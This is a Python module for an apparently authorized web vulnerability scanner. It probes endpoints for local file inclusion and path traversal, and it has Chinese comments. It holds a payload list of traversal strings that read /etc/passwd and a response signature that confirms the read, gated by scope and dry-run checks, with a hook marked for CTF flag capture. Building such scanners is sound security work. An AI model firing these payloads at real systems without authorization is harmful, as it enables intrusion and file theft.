"""LFI / 路径穿越探针（利用型·PoC 级）—— 读取 /etc/passwd 这一无害标准证明。

主动探针：受 scope + dry_run 门控。GET/POST 均可注入（带会话）。仅读世界可读的 /etc/passwd 作最小 PoC。
"""
from __future__ import annotations

import re
from urllib.parse import urlparse

from hermes import cli, tools
from hermes.scanners import Scanner
from hermes.scope import Scope

PROBES = ["../../../../../../etc/passwd", "....//....//....//etc/passwd",
          "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd"]
SIG = re.compile(r"root:x:0:0:")
FILE_PARAMS = {"file", "path", "page", "doc", "template", "include", "name", "read", "filename", "load"}


def _host(url):
    return urlparse(url).netloc or url


def scan(ep: dict) -> list:
    if not cli.allow_active(Scope.load()):
        return []
    cands = []
    params = tools.injectable(ep)
    targets = [p for p in params if p.lower() in FILE_PARAMS] or params
    for p in targets:
        for probe in PROBES:
            try:
                r, req = tools.inject(ep, p, probe)
            except Exception:  # noqa: BLE001
                continue
            if SIG.search(r.text):
                c = tools.make_candidate(
                    f"lfi-{p}-{_host(ep['url'])}", f"{req['method']} {req['url']}",
                    f"参数 {p} 本地文件包含 / 路径穿越：读取到 /etc/passwd",
                    "Path Traversal", "high", "broken_access_control.path_traversal_local_file_inclusion",
                    check={"kind": "reproduce", "request": req, "needle": "root:x:0:0:"},
                    impact="可读取服务器任意文件（此处仅读无害的 /etc/passwd 作 PoC）",
                    steps=[f"{req['method']} {req['url']}", "响应含 root:x:0:0: 证明可读取 /etc/passwd"])
                c["_exploit"] = {"ep": ep, "param": p, "kind": "lfi"}   # CTF flag 捕获用
                cands.append(c)
                break
    return cands


SCANNER = Scanner(domain="lfi", applies=lambda ep: bool(tools.injectable(ep)), scan=scan)
